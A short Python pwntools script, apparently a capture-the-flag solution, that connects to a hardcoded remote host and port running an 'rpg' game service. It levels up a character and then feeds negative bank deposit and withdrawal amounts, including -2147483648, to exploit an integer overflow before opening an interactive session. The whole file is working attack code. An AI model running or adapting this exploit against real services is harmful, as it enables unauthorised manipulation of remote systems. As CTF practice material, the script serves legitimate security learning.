#!/usr/bin/env python
from pwn import *

# I d0 n0t have en0ugh time. H0w t0 use it. It's imp0rtant.

host , port = '110.10.147.121' , 46712
y = remote( host , port )
#y = process( './rpg' )


def lv_up():
    for i in xrange( 10 ):
        print i
        y.sendlineafter( '>>' , '1' )
    y.sendlineafter( '>>' , '5' )
    y.sendlineafter( '>>' , '5' )

def save_bank( amount ):
    y.sendlineafter( '>>' , '8' )
    y.sendlineafter( '>>' , '1' )
    y.sendlineafter( ':' , str( amount ) )

def withdraw( amount ):
    y.sendlineafter( '>>' , '8' )
    y.sendlineafter( '>>' , '2' )
    y.sendlineafter( ':' , str( amount ) )

y.sendlineafter( '>>' , '1' )

for i in range( 4 ):
    print i
    lv_up()


save_bank(-1)


withdraw( -700 )
withdraw( -2147483648 )


y.interactive()